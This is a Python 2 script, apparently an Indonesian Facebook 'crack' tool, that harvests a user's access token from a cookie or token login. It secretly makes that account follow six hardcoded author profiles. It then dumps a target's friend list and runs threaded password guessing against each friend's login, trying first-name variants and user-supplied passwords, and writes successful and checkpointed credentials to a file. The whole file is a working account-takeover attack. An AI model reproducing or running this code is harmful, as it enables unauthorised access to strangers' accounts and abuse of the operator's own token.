#!/usr/bin/python2
# coding=utf-8
# Facebook  : Dapunta Khurayra X
# Instagram : ratya.anonym.id

import os,re,sys,itertools,time,requests,random,threading,json,random
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')

def keluar():
	print ("   [!] Exit")
	os.sys.exit()

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)

def banner():
    os.system('echo -e "             _______      ________  ___  _______ __\n            / __/ _ )____/ ___/ _ \/ _ |/ ___/ //_/\n           / _// _  /___/ /__/ , _/ __ / /__/ ,< \n          /_/ /____/    \___/_/|_/_/ |_\___/_/|_|\n\n               Coded By : Dapunta Khurayra X\n─────────────────────────────────────────────────────────────" | lolcat')

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
fbid = []

def login():
    os.system("clear")
    banner()
    print("\n   [ Choose Login Methode ]")
    print("\n   [1] Login With Token")
    print("   [2] Login With Cookie")
    print("   [0] Exit")
    sek=raw_input("\n   [•] Choose : ")
    if sek=="":
        print("   [!] Fill In The Correct")
        login()
    elif sek=="1":
        log_token()
    elif sek=="2":
        log_cookie()
    elif sek=="0":
        exit()
    else:
        print("   [!] Fill In The Correct")
        login()

def log_token():
    os.system('clear')
    banner()
    toket = raw_input("\n   [•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\n   [•] Login Successful')
        bot_follow()
    except KeyError:
        print ("   [!] Token Invalid")
        os.system('clear')
        login()
		
def log_cookie():
        os.system("clear")
        banner()
        cookie = raw_input("\n   [•] Cookie : ")
        try:
                data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
                'referer'                   : 'https://m.facebook.com/',
                'host'                      : 'm.facebook.com',
                'origin'                    : 'https://m.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
                }, cookies = {
                'cookie'                    : cookie
                })
                find_token = re.search('(EAAA\w+)', data.text)
                hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print "   [!] No Connection"
        cookie = open("login.txt", 'w')
        cookie.write(find_token.group(1))
        cookie.close()
        print("\n   [•] Login Success")
        bot_follow()
        
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Token invalid")
		login()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
    	menu()

def menu():
    try:
	toket = open('login.txt','r').read()
	otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
	a = json.loads(otw.text)
	nama = a['name']
	id = a['id']
    except Exception as e:
	print ("   [•] Error : %s"%e)
	login()
    os.system("clear")
    banner()
    print("\n   [•] Hello : "+nama)
    print("   [•] UID   : "+id)
    os.system('echo -e "\n─────────────────────────────────────────────────────────────" | lolcat')
    print ("\n   [ Choose Options ]")
    print ("\n   [1] Crack From Friend/Public ID")
    print ("   [2] Crack From Follower")
    print ("   [0] Log Out")
    opt = raw_input("\n   [•] Choose : ")
    if opt=="":
        print("   [!] Fill In The Correct")
        menu()
    elif opt=="1":
        public()
    elif opt=="2":
        public()
    elif opt=="0":
        os.system('rm -rf login.txt')
        exit()
    else:
        print("   [!] Fill In The Correct")
        menu()

def public():
    os.system("clear")
    banner()
    try:
	    toket = open('login.txt','r').read()
	    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
	    a = json.loads(otw.text)
	    nama = a['name']
	    id = a['id']
    except Exception as e:
	    print ("   [•] Error : %s"%e)
	    login()
    print("\n   [•] Type \'me\' To Dump From Friendlist")
    idp = raw_input("   [•] User ID Target : ")
    try:
	   pok = requests.get("https://graph.facebook.com/"+idp+"?access_token="+toket)
	   sp = json.loads(pok.text)
	   print "   [•] Name           : "+sp["name"]
    except KeyError:
	    print ("   [!] Wrong ID Target")
	    raw_input("\n   [ Back ]")
	    menu()
    except requests.exceptions.ConnectionError:
	    print ("   [!] No Connection")
	    exit()
    r = requests.get("https://graph.facebook.com/"+idp+"/friends?access_token="+toket)
    z = json.loads(r.text)
    for i in z['data']:
	    id.append(i['id'])
    print "   [•] Total ID       : "+str(len(id))
        
    def main(arg):
                pm4 = raw_input ("   [•] Pass 1 : ")
                pm5 = raw_input ("   [•] Pass 2 : ")
                pm6 = raw_input ("   [•] Pass 3 : ")
                print("   [•] Crack Started...\n")
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pm = v['first_name'].lower()
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pm, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '   [OK] '+em+' • '+pm
				oke = open('done/crack.txt', 'a')
				oke.write('\n   [OK] '+em+' • '+pm)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '   [CP] '+em+' • '+pm
					cek = open('done/crack.txt', 'a')
					cek.write('\n   [CP] '+em+' • '+pm)
					cek.close()
					cekpoint.append(em)
				else:
					pm2 = v['first_name'].lower()+'123'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pm2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '   [OK] '+em+' • '+pm2
						oke = open('done/crack.txt', 'a')
						oke.write('\n   [OK] '+em+' • '+pm2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '   [CP] '+em+' • '+pm2
							cek = open('done/crack.txt', 'a')
							cek.write('\n   [CP] '+em+' • '+pm2)
							cek.close()
							cekpoint.append(em)
						else:
							pm3 = v['first_name'].lower()+'12345'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pm3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '   [OK] '+em+' • '+pm3
								oke = open('done/crack.txt', 'a')
								oke.write('\n   [OK] '+em+' • '+pm3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '   [CP] '+em+' • '+pm3
									cek = open('done/crack.txt', 'a')
									cek.write('\n   [CP] '+em+' • '+pm3)
									cek.close()
									cekpoint.append(em)
                                				else:
                                    					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pm4, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
                                    					xo = rex.content
                                    					if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        					print '   [OK] '+em+' • '+pm4
                                        					oke = open('done/crack.txt', 'a')
                                        					oke.write('\n   [OK] '+em+' • '+pm4)
                                        					oke.close()
                                        					oks.append(em)
                                    					else :
                                        					if 'checkpoint' in xo:
                                            						print '   [CP] '+em+' • '+pm4
						    					cek = open('done/crack.txt', 'a')
                                            						cek.write('\n   [CP] '+em+' • '+pm4)
                                            						cek.close()
                                            						cekpoint.append(em)
                                        					else:
                                            						rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pm5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
                                            						xo = rex.content
                                            						if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                                						print '   [OK] '+em+' • '+pm5
                                                						oke = open('done/crack.txt', 'a')
                                                						oke.write('\n   [OK] '+em+' • '+pm5)
                                                						oke.close()
                                                						oks.append(em)
                                           						else:
                                                						if 'checkpoint' in xo:
                                                    							print '   [CP] '+em+' • '+pm5
                                                   	 						cek = open('done/crack.txt', 'a')
                                                    							cek.write('\n   [CP] '+em+' • '+pm5)
                                                    							cek.close()
                                                    							cekpoint.append(em)
                                                						else:
                                                    							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pm6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
                                                    							xo = rex.content
                                                    							if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                                        							print '   [OK] '+em+' • '+pm6
                                                        							oke = open('done/crack.txt', 'a')
                                                        							oke.write('\n   [OK] '+em+' • '+pm6)
                                                        							oke.close()
                                                        							oks.append(em)
                                                    							else:
                                                        							if 'checkpoint' in xo:
                                                        								print '   [CP] '+em+' • '+pm6
                                                        								cek = open('done/crack.txt', 'a')
                                                        								cek.write('\n   [CP] '+em+' • '+pm6)
                                                        								cek.close()
                                                        								cekpoint.append(em)
        	except:
			pass
    p = ThreadPool(20)
    p.map(main, id)
    print ("\n   [•] Crack Finished")
    print "   [•] Total OK/CP: "+str(len(oks))+"/"+str(len(cekpoint))
    print ("   [•] File Saved At : done/crack.txt")
    raw_input("   [ Back ]")
    os.system("python2 fbcrack.py")


























































if __name__=='__main__':
  menu()
